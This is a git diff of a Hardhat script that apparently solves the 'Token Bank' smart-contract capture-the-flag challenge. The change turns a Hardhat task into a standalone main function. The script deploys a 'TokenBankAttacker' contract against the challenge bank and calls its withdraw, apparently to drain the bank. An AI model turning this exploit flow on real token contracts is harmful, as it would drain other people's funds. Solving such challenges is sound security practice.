@@ -1,17 +1,17 @@
 import { BigNumber } from "ethers";
-import { task } from "hardhat/config";
+import { ethers } from "hardhat";
 
 const contractAddress = "0x9C7882D9c0AB4Dd7d9aa0D8129F09eF51e255e4c";
 
-task("token-bank", "Solves the 'Token Bank' challenge", async (_taskArgs, hre) => {
-  const challengeFactory = await hre.ethers.getContractFactory("TokenBankChallenge");
+async function main() {
+  const challengeFactory = await ethers.getContractFactory("TokenBankChallenge");
   const bankContract = challengeFactory.attach(contractAddress);
 
   const tokenAddress = await bankContract.token();
-  const tokenFactory = await hre.ethers.getContractFactory("SimpleERC223Token");
+  const tokenFactory = await ethers.getContractFactory("SimpleERC223Token");
   const tokenContract = tokenFactory.attach(tokenAddress);
 
-  const attackFactory = await hre.ethers.getContractFactory("TokenBankAttacker");
+  const attackFactory = await ethers.getContractFactory("TokenBankAttacker");
   const attackContract = await attackFactory.deploy(bankContract.address, tokenContract.address);
   await attackContract.deployed();
 
@@ -33,4 +33,9 @@ task("token-bank", "Solves the 'Token Bank' challenge", async (_taskArgs, hre) =
 
   tx = await attackContract.withdraw();
   await tx.wait();
+}
+
+main().catch(error => {
+  console.error(error);
+  process.exit(1);
 });
